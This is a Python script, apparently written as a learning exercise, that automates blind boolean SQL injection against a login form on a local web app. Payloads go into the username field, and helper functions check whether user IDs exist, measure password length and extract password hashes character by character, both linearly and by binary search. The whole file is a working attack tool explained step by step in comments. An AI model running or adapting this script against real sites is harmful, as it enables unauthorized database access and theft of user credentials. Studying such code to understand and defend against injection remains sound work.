import requests  # We're going to inject a web app with SQL so we need this package to interact with the web app

total_queries = 0  # Allows us to keep track of the number of injections we make in the web app
charset = "0123456789abcdef"  # Since we're looking for hashes(stored in hex), we're going to use all possibilities
# of hex in our character set
target = "http://127.0.0.1:5000"  # Our targeted web app
needle = "Welcome back"  # This is the content in the web app we will use to get our result


def injected_query(payload):    # This function tells us if our query is valid or invalid
    global total_queries
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
    total_queries += 1  # Once we send one payload, we add one to the tally of our total_queries
    return needle.encode() not in r.content  # Once the needle is not in the response, we can say the operation
    # succeeded. The return will be True or False, it doesn't have to be a successful SQL injection.


def boolean_query(offset, user_id, character, operator=">"):  # This will give us a true or false result for our
    # injected queries. In other words, this function identifies, at a certain offset, whether a character is valid
    # or invalid
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset + 1, user_id,
                                                                                                operator,
                                                                                                character)  # This is the payload we'll be inserting
    return injected_query(payload)


def invalid_user(user_id):  # This function tells us if a user_id is valid or invalid
    payload = "(select id from user where id = {}) >= 0".format(user_id)  # We can use this to see if a user exists
    # or not
    return injected_query(payload)


def password_length(user_id):   # This function checks the password length of a user
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id,
                                                                                                                i)
        if not injected_query(payload):
            return i
        i += 1


def extract_hash(charset, user_id, password_length):    # This function extracts a hash of the user's password
    found = ""
    for i in range(0, password_length):  # We are iterating over the length of the password because
        for j in range(len(charset)):  # for each index in the length of the password, we want to identify the
            # correct value by taking each element from the charset and creating a boolean query which will respond
            # true or false if the query is true or false.
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found


def extract_hash_bst(charset, user_id, password_length): # This is the concept of binaries for restricted SQL queries
    found = ""
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1:
                if start == 0 and boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start + 1]
                break
            else:
                middle = (start + end) // 2
                if boolean_query(index, user_id, charset[middle]):
                    end = middle
                else:
                    start = middle
    return found


def total_queries_taken():  # This function shows us how many queries we've made for debugging and logging purposes.
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0


while True:
    try:
        user_id = input("Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
    except requests.ConnectionError:
        print("Attempt to connect failed.")
        break


